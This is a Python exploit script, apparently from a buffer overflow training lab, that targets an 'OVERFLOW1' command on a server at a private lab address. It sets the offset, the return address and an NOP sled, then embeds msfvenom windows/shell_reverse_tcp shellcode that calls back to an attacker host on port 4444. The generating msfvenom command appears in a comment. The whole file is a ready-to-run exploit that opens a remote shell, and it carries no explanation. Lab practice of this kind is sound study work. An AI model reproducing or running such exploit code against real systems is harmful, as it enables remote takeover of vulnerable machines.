import socket

ip = "10.10.101.71"
port = 1337

# bad chars: \x00\x07\x2e\xa0
# jmp addr : 625011af

# msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.116 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xbf\x4c\x58\xf1\x1c\xdb\xdf\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x7b\x12\x83\xc3\x04\x03\x37\x56\x13\xe9\x3b\x8e\x51"
"\x12\xc3\x4f\x36\x9a\x26\x7e\x76\xf8\x23\xd1\x46\x8a\x61\xde"
"\x2d\xde\x91\x55\x43\xf7\x96\xde\xee\x21\x99\xdf\x43\x11\xb8"
"\x63\x9e\x46\x1a\x5d\x51\x9b\x5b\x9a\x8c\x56\x09\x73\xda\xc5"
"\xbd\xf0\x96\xd5\x36\x4a\x36\x5e\xab\x1b\x39\x4f\x7a\x17\x60"
"\x4f\x7d\xf4\x18\xc6\x65\x19\x24\x90\x1e\xe9\xd2\x23\xf6\x23"
"\x1a\x8f\x37\x8c\xe9\xd1\x70\x2b\x12\xa4\x88\x4f\xaf\xbf\x4f"
"\x2d\x6b\x35\x4b\x95\xf8\xed\xb7\x27\x2c\x6b\x3c\x2b\x99\xff"
"\x1a\x28\x1c\xd3\x11\x54\x95\xd2\xf5\xdc\xed\xf0\xd1\x85\xb6"
"\x99\x40\x60\x18\xa5\x92\xcb\xc5\x03\xd9\xe6\x12\x3e\x80\x6e"
"\xd6\x73\x3a\x6f\x70\x03\x49\x5d\xdf\xbf\xc5\xed\xa8\x19\x12"
"\x11\x83\xde\x8c\xec\x2c\x1f\x85\x2a\x78\x4f\xbd\x9b\x01\x04"
"\x3d\x23\xd4\x8b\x6d\x8b\x87\x6b\xdd\x6b\x78\x04\x37\x64\xa7"
"\x34\x38\xae\xc0\xdf\xc3\x39\xe5\x16\xc8\xcd\x91\x2a\xce\x3c"
"\x3e\xa2\x28\x54\xae\xe2\xe3\xc1\x57\xaf\x7f\x73\x97\x65\xfa"
"\xb3\x13\x8a\xfb\x7a\xd4\xe7\xef\xeb\x14\xb2\x4d\xbd\x2b\x68"
"\xf9\x21\xb9\xf7\xf9\x2c\xa2\xaf\xae\x79\x14\xa6\x3a\x94\x0f"
"\x10\x58\x65\xc9\x5b\xd8\xb2\x2a\x65\xe1\x37\x16\x41\xf1\x81"
"\x97\xcd\xa5\x5d\xce\x9b\x13\x18\xb8\x6d\xcd\xf2\x17\x24\x99"
"\x83\x5b\xf7\xdf\x8b\xb1\x81\x3f\x3d\x6c\xd4\x40\xf2\xf8\xd0"
"\x39\xee\x98\x1f\x90\xaa\xb9\xfd\x30\xc7\x51\x58\xd1\x6a\x3c"
"\x5b\x0c\xa8\x39\xd8\xa4\x51\xbe\xc0\xcd\x54\xfa\x46\x3e\x25"
"\x93\x22\x40\x9a\x94\x66")

postfix = prefix

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")